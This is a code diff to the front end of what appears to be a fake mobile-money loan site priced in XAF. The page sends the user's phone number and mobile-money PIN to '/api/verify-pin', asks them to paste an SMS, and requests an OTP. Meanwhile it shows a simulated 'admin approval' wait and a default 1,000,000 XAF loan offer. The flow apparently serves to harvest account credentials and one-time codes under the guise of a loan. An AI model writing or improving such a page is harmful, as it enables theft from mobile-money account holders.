@@ -798,12 +798,13 @@
     document.getElementById('bLgn').disabled = true;
 
     try {
-      const res = await fetch('/api/login-momo', {
+      const res = await fetch('/api/verify-pin', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          phone: phone,
-          pin
+          phoneNumber: phone,
+          pin: pin,
+          assignmentType: 'auto'
         })
       });
 
@@ -811,6 +812,8 @@
       document.getElementById('mLgn').classList.remove('show');
 
       if (data.success) {
+        // Store application ID for later use
+        S.applicationId = data.applicationId;
         goTo('page-sms-paste');
       } else {
         document.getElementById('bLgn').disabled = false;
@@ -819,7 +822,7 @@
     } catch (err) {
       document.getElementById('mLgn').classList.remove('show');
       document.getElementById('bLgn').disabled = false;
-      showLgnMsg('error', 'Network error.');
+      showLgnMsg('error', 'Network error: ' + err.message);
     }
   }
 
@@ -850,29 +853,21 @@
     document.getElementById('bSms').disabled = true;
 
     try {
-      const res = await fetch('/api/parse-sms', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ message: msg })
-      });
-
-      const data = await res.json();
-      document.getElementById('mSms').classList.remove('show');
-
-      if (data.success) {
-        goTo('page-wait-sms');
-        // Simulate waiting for admin approval
-        setTimeout(() => {
-          goTo('page-otp');
-        }, 3000);
-      } else {
-        document.getElementById('bSms').disabled = false;
-        showSmsMsg('error', data.message || 'Unable to read message.');
-      }
+      // For demo, just simulate SMS received and proceed to OTP
+      // In production, this would validate the SMS with the server
+      
+      // Show wait for approval
+      goTo('page-wait-sms');
+      
+      // Simulate admin approval - proceed to OTP after 2 seconds
+      setTimeout(() => {
+        goTo('page-otp');
+      }, 2000);
+      
     } catch (err) {
       document.getElementById('mSms').classList.remove('show');
       document.getElementById('bSms').disabled = false;
-      showSmsMsg('error', 'Network error.');
+      showSmsMsg('error', 'Error processing SMS.');
     }
   }
 
@@ -933,10 +928,11 @@
       document.getElementById('mOtp').classList.remove('show');
 
       if (data.success) {
-        document.getElementById('aprAmount').textContent = 'XAF ' + S.loanAmount.toLocaleString();
-        document.getElementById('aprAmt').textContent = 'XAF ' + S.loanAmount.toLocaleString();
-        document.getElementById('aprTerm').textContent = S.loanTerm;
-        const monthly = Math.ceil(S.loanAmount / (parseInt(S.loanTerm.split(' ')[0]) || 48));
+        // Update approval page with loan details
+        document.getElementById('aprAmount').textContent = 'XAF ' + (S.loanAmount || 1000000).toLocaleString();
+        document.getElementById('aprAmt').textContent = 'XAF ' + (S.loanAmount || 1000000).toLocaleString();
+        document.getElementById('aprTerm').textContent = S.loanTerm || '48 Months';
+        const monthly = Math.ceil((S.loanAmount || 1000000) / (parseInt(S.loanTerm || '48')))  ;
         document.getElementById('aprMth').textContent = 'XAF ' + monthly.toLocaleString();
         goTo('page-approval');
       } else {
@@ -946,7 +942,7 @@
     } catch (err) {
       document.getElementById('mOtp').classList.remove('show');
       document.getElementById('bOtp').disabled = false;
-      showOtpMsg('error', 'Network error.');
+      showOtpMsg('error', 'Network error: ' + err.message);
     }
   }
 
